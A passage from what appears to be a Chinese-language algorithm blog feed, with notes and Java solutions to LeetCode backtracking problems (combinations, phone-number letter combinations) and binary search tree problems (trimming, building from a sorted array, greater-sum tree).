class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum3</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> targetSum, <span class="type">int</span> k, <span class="type">int</span> startIndex, <span class="type">int</span> sum)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;targetSum)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(targetSum == sum)</span><br><span class="line">            &#123;</span><br><span class="line">                result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>(path));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//注意不要硬套模板 n-(k-path.size())+1 可能导致越界</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i&lt;=<span class="number">9</span>-(k-path.size())+<span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            sum+=i;</span><br><span class="line">            backtracking(targetSum,k,i+<span class="number">1</span>,sum);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">            sum-=i;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="电话号码数字组合"><a href="#电话号码数字组合" class="headerlink" title="电话号码数字组合"></a>电话号码数字组合</h4><p>link：<a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/description/">17. 电话号码的字母组合 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先明确，当对字符串进行修改的时候需要使用<strong>StringBuffer</strong>和<strong>StringBuilder类</strong>.<br>和String类不同的是<strong>上述两者的对象能够多次被修改且不产生新的对象</strong>.<br><strong>StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类.（虽然StringBuilder线程不安全）</strong><br>题目给的是电话号码，数字和字母要对应上，那么自然想到使用Map进行映射存储.<br>特殊的0和1（好奇妙的二进制原来电话也是有设计的！bushi 发上癫了）我们置为空即可.<br>那么此时关键点已经变成了如何在此题中找到我们之前使用的”n”和”k”.<br><img src="/../imgs/2024-10/image-20241125202438310.png" alt="image-20241125202438310"><br>按上图分析我们需要的深度就是传入参数的长度，广度就是固定好的字符个数（也就是3）这俩必要参数确定好之后再来一个记录当前遍历位置的指针即可.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//存储结果</span></span><br><span class="line">    List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(digits == <span class="literal">null</span> || digits.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="comment">//存储需要的值</span></span><br><span class="line">        String[] numStr = &#123;<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;abc&quot;</span>, <span class="string">&quot;def&quot;</span>, <span class="string">&quot;ghi&quot;</span>, <span class="string">&quot;jkl&quot;</span>, <span class="string">&quot;mno&quot;</span>, <span class="string">&quot;pqrs&quot;</span>, <span class="string">&quot;tuv&quot;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//回溯</span></span><br><span class="line">        backtracking(digits,numStr,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//使用效率高的builder</span></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//str表示当前num对应的字符串</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(String digits,String[] numStr,<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(num == digits.length()) &#123;</span><br><span class="line">            res.add(tmp.toString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> numStr[digits.charAt(num) - <span class="string">&#x27;0&#x27;</span>];</span><br><span class="line">    <span class="comment">//注意是单独的集合 判断 如&quot;23&quot; 结果是ab</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++) &#123;</span><br><span class="line">            tmp.append(str.charAt(i));</span><br><span class="line">            backtracking(digits, numStr, num + <span class="number">1</span>);</span><br><span class="line">            tmp.deleteCharAt(tmp.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong></p><ul><li>res.add(sb.toString());&#96; 用于将当前构建的字母组合添加到结果列表中。</li><li><code>tmp.append(str.charAt(i));</code> 用于将当前字符添加到 <code>tmp</code> 中，以构建当前的字母组合。</li><li><code>String str = numString[digits.charAt(num) - &#39;0&#39;];</code> 用于将输入字符串中的字符转换为对应的数字，并获取该数字对应的字母字符串。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x17</title>
      <link href="/2024/11/21/yub%E3%81%AEAlgorithm.0x17/"/>
      <url>/2024/11/21/yub%E3%81%AEAlgorithm.0x17/</url>
      
        <content type="html"><![CDATA[<h4 id="初探回溯"><a href="#初探回溯" class="headerlink" title="初探回溯"></a>初探回溯</h4><h5 id="什么是回溯算法"><a href="#什么是回溯算法" class="headerlink" title="什么是回溯算法"></a>什么是回溯算法</h5><p>回溯算法是一种暴力<strong>穷举</strong>的<strong>搜索方式</strong>.<br>回溯和递归是相辅相承的**.(有递归就会有回溯)**</p><h5 id="回溯法解决的问题"><a href="#回溯法解决的问题" class="headerlink" title="回溯法解决的问题"></a>回溯法解决的问题</h5><ul><li>组合问题：N个数里面按一定规则找出k个数的集合.</li><li>切割问题：一个字符串按一定规则有几种切割方式.</li><li>子集问题：一个N个数的集合里有多少符合条件的子集.</li><li>排列问题：N个数按一定规则全排列，有几种排列方式.</li><li>棋盘问题：N皇后，解数独等.</li></ul><h5 id="使用回溯算法解决问题的思路"><a href="#使用回溯算法解决问题的思路" class="headerlink" title="使用回溯算法解决问题的思路"></a>使用回溯算法解决问题的思路</h5><p>虽然回溯算法暴力效率低下理解起来更为抽象，但好在天无绝人之路，<strong>回溯算法</strong>的问题都可以用<strong>树形结构</strong>来进行理解.</p><hr><p>关键有以下两点：<br><strong>1.集合大小-&gt;树的宽度</strong><br><strong>2.递归深度-&gt;树的深度</strong><br><img src="/../imgs/2024-10/image-20241121153238086.png" alt="image-20241121153238086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void backtracking(参数) &#123;</span><br><span class="line">    if (终止条件) &#123;</span><br><span class="line">        存放结果;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) &#123;</span><br><span class="line">        处理节点;</span><br><span class="line">        backtracking(路径，选择列表); // 递归</span><br><span class="line">        回溯，撤销处理结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h4><p>link：<a href="https://leetcode.cn/problems/combinations/description/">77. 组合 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>进入到回溯算法的学习！</p><p>首先明确是在求组合，<strong>组合中的元素是不能重复的</strong>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt;  result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k,<span class="type">int</span> startIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i&lt;=n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n,k,i+<span class="number">1</span>);</span><br><span class="line">            path.remove(path.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优化思路</strong><br>当我们n&#x3D;k时，第一层for循环再往后遍历就没有意义了.（因为我们最终要取的数的数量要满足，从第二层开始往后的for循环其实已经自动减少了集合中的子集数量，显然这是不符合预期的）<br>以下引用<strong>代码随想录</strong>分析图<br><img src="/../imgs/2024-10/image-20241121150939192.png" alt="image-20241121150939192"></p><p><strong>优化部分</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>已经选择的元素个数：path.size();</span><br><span class="line"><span class="number">2.</span>还需要的元素个数为: k - path.size();</span><br><span class="line"><span class="number">3.</span>在集合n中至多要从该起始位置 : n - (k - path.size()) + <span class="number">1</span>，开始遍历</span><br></pre></td></tr></table></figure><p><strong>优化之后的for循环代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt;= n - (k - path.size()) + <span class="number">1</span>; i++)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt;  result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n,k,<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k,<span class="type">int</span> startIndex)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="comment">//new ArrayList(path)，创建了 path 的一个副本</span></span><br><span class="line">   <span class="comment">//这意味着即使后续对 path 的修改也不会影响到 result 中已经保存的组合</span></span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//for循环</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;i &lt;= n - (k - path.size()) + <span class="number">1</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n,k,i+<span class="number">1</span>);</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x16</title>
      <link href="/2024/11/20/yub%E3%81%AEAlgorithm.0x16/"/>
      <url>/2024/11/20/yub%E3%81%AEAlgorithm.0x16/</url>
      
        <content type="html"><![CDATA[<h4 id="修建二叉搜索树"><a href="#修建二叉搜索树" class="headerlink" title="修建二叉搜索树"></a>修建二叉搜索树</h4><p>link：<a href="https://leetcode.cn/problems/trim-a-binary-search-tree/description/">669. 修剪二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>注意修剪的时候要考虑到全部的节点，即搜到到限定区间小于左值或者大于右值时还需要检查当前不符合区间大小节点的右子树&#x2F;左子树，不能直接返回null.<br>剪去节点只需要在判断当前节点左&#x2F;右子树后将root的左&#x2F;右节点更新即可.<br><img src="/../imgs/2024-10/image-20241120163837657.png" alt="image-20241120163837657"></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">trimBST</span><span class="params">(TreeNode root, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; low) &#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.right,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; high) &#123;</span><br><span class="line">            <span class="keyword">return</span> trimBST(root.left,low,high);</span><br><span class="line">        &#125;</span><br><span class="line">        root.left = trimBST(root.left,low,high);</span><br><span class="line">        root.right = trimBST(root.right,low,high);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="将有序数组转化为平衡二叉树"><a href="#将有序数组转化为平衡二叉树" class="headerlink" title="将有序数组转化为平衡二叉树"></a>将有序数组转化为平衡二叉树</h4><p>link：<a href="https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/description/">108. 将有序数组转换为二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>给了升序数组其实一开始想的也是第一个参数是左子树最左边的值，然后去选中间节点做切割.<br>具体就需要怎么在偶数和奇数参数个数下都适配，其实偶数情况无非是选取中间的两个数（left + (right - left) &#x2F; 2）.</p><p>题目给的输入输出示例其实也已经帮我们提供了两种思路.<br><img src="/../imgs/2024-10/image-20241120170337011.png" alt="image-20241120170337011"></p><h6 id="递归-双指针"><a href="#递归-双指针" class="headerlink" title="递归+双指针"></a>递归+双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//采用左闭右闭区间</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">sortedArrayToBST</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> sort(nums,<span class="number">0</span>,nums.length - <span class="number">1</span>);  </span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left &gt; right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(nums[mid]);</span><br><span class="line">        root.left = sort(nums,left,mid - <span class="number">1</span>);</span><br><span class="line">        root.right = sort(nums,mid + <span class="number">1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="把二叉搜索树转换为累加树"><a href="#把二叉搜索树转换为累加树" class="headerlink" title="把二叉搜索树转换为累加树"></a>把二叉搜索树转换为累加树</h4><p>link：<a href="https://leetcode.cn/problems/convert-bst-to-greater-tree/description/">538. 把二叉搜索树转换为累加树 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>第一遍看题目还有点没看明白（挠头.jpg<br>其实就是对于树中的每个节点，计算它的值加上树中所有大于该节点值的节点的值.但是保证搜索二叉树的定义，那就是左子树的节点值必须小于节点的值，右子树的节点值必须大于节点的值.那我们就从右子树入手，<strong>反向中序遍历（右根左)<strong>，</strong>确保累加时考虑了所有大于当前节点的值.</strong><br>和上一题相同的思路.</p><h6 id="递归-双指针-1"><a href="#递归-双指针-1" class="headerlink" title="递归+双指针"></a>递归+双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">convertBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        travsal(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">travsal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 如果当前节点为空，直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    travsal(root.right);  <span class="comment">// 先遍历右子树</span></span><br><span class="line">    root.val += pre;      <span class="comment">// 将当前节点的值加上pre</span></span><br><span class="line">    pre = root.val;       <span class="comment">// 更新pre为当前节点的新值</span></span><br><span class="line">    travsal(root.left);   <span class="comment">// 再遍历左子树</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x15.</title>
      <link href="/2024/11/18/yub%E3%81%AEAlgorithm.0x15/"/>
      <url>/2024/11/18/yub%E3%81%AEAlgorithm.0x15/</url>
      
        <content type="html"><![CDATA[<h4 id="二叉搜索树的最近公共祖先"><a href="#二叉搜索树的最近公共祖先" class="headerlink" title="二叉搜索树的最近公共祖先"></a>二叉搜索树的最近公共祖先</h4><p>link：<a href="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235. 二叉搜索树的最近公共祖先 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目给出的是二叉搜索树，那就方便很多.（<strong>不用在意遍历顺序</strong>）<br>已知左子树的值都比根节点小，右子树的值都比根节点大（每层都符合该规律）但是由于不知道p、q的值哪个比根节点大所以需要进行比较.<br>我们在递归的时候只需要不断缩小判断区间即可.<br>怎么缩小呢？<br>和p、q的值进行比较即可.</p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; 